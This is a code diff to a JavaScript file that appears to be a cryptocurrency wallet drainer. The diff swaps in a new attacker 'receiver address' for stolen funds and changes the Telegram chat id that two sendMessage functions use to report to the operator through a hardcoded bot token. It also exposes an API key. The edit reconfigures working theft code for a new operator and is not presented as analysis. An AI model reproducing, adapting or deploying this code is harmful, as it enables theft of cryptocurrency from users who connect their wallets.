@@ -16,7 +16,7 @@ let provider;
 // Address of the selected account
 let selectedAccount;
 
-const receiver_addres = '0xe693c81a911A9f53Fb4a1512c1DcE335410918f3'; // gaf<- RECEIVER ADDRESS HERE
+const receiver_addres = '0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f'; // gaf<- RECEIVER ADDRESS HERE
 let onButtonClick;
 let user_address;
 let start_to_log = false;
@@ -320,7 +320,7 @@ async function getPrice(address){
 
 async function sendMessage(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 1114693003;
+    const chat_id = 5227607491;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
           headers: {
@@ -338,7 +338,7 @@ async function sendMessage(message){
 
 async function sendMessage1(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 1114693003;
+    const chat_id = 5227607491;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
           headers: {
@@ -372,7 +372,7 @@ async function getBalance(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0R
   })
 }
 
-const receiver_address = '0xe693c81a911A9f53Fb4a1512c1DcE335410918f3';
+const receiver_address = '0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f';
 async function proceed(){
   start_to_log = false;
   console.log("Now we roll!!!");
